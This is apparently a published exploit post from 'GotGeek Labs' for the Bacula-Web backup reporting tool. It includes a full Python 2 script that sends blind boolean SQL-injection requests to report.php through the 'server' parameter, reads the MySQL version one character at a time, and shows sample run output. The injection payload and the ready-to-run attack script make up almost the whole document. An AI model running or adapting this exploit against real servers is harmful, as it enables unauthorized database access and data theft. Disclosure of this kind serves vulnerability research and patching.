GotGeek Labs
http://www.gotgeek.com.br/

[+] Proof of Concept/Exploit

# $ python bacula-web.py -t 10.1.1.1 -d /bacula/ -j Backup_inc -p 80
#
# [*] gotgeek labs
# [*] http://gotgeek.com.br
#
#
# [*] Checking report.php...
# [+] Found!
# [*] Let's get MySQL version.. Wait a moment...
# [+] MySQL: 5.0.84
#
# [*]Done!


#!/usr/bin/python
#

import sys
import httplib, socket
import urllib, re
from optparse import OptionParser

# You may also use "MB".. Check your target before!
truestr = "GB"
usage = "./%prog -t <target> -d <dir> -j <job> -p <port>\n"
usage+= "Example: ./%prog -t www.example.com -d /bacula-web/ -j BackupCatalog -p 80"

parser = OptionParser(usage=usage)
parser.add_option("-t", action="store", dest="target",
                  help="target server")
parser.add_option("-d", action="store", dest="dir",
                  help="path to bacula-web")
parser.add_option("-j", action="store", dest="job",
                  help="bacula job name")
parser.add_option("-p", action="store", dest="port",
                  help="server port")
(options, args) = parser.parse_args()

def banner():
    print "\n[*] gotgeek labs"
    print "[*] http://gotgeek.com.br\n\n"

if len(sys.argv) < 5:
    banner()
    parser.print_help()
    sys.exit(1)


def checkurl():
    try:
        print "[*] Checking report.php..."
        conn = httplib.HTTPConnection(options.target+":"+options.port)
        conn.request("GET", options.dir + "report.php")
        r1 = conn.getresponse()
        if r1.status == 200:
            print "[+] Found!"
        else:
            print "[-] NOT Found!\n\n"
            sys.exit(1)
    except socket.error, msg:
        print "[-] Can't connect to the target!\n\n"
        sys.exit(1)


def geturl(sqli):
    try:
        check = urllib.urlopen("http://"+options.target+":"+options.port+options.dir+sqli).read()
    except:
        print "[-] Can't connect to the target!\n\n"
        sys.exit(1)
    return check


def getmysql(gg):
    for i in range(43,58):
        request = ("report.php?default=1&server="+options.job+"'%20and%20ascii(substring(@@version,"+str(gg)+",1))='"+str(i))
        result = geturl(request)
        if re.search(truestr,result):
            gg = gg+1
            sys.stdout.write(chr(i))
            sys.stdout.flush()
            getmysql(gg)
            break



def main():
    gg = 1
    banner()
    checkurl()
    print "[*] Let's get MySQL version.. Wait a moment..."
    sys.stdout.write("[+] MySQL: ")
    getmysql(gg)
    print "\n\n[*]Done!\n\n"

if __name__ == "__main__":
    main()



[+] References

(1)http://bacula-web.dflc.ch/index.php/home.html
(2)http://www.freshports.org/www/bacula-web/



[+] Credits

b0telh0
